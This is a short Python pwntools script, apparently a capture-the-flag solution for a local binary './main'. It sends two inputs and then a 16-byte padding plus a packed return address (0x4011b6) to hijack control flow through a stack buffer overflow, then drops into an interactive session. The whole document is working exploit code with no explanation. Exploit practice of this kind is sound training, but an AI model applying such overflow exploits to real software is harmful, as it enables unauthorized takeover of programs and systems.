from pwn import *

p = process('./main')

p.sendline(b'8')

p.sendline(b"tekupaa")

p.sendline(b'A'*16 + p64(0x4011b6))

p.interactive()
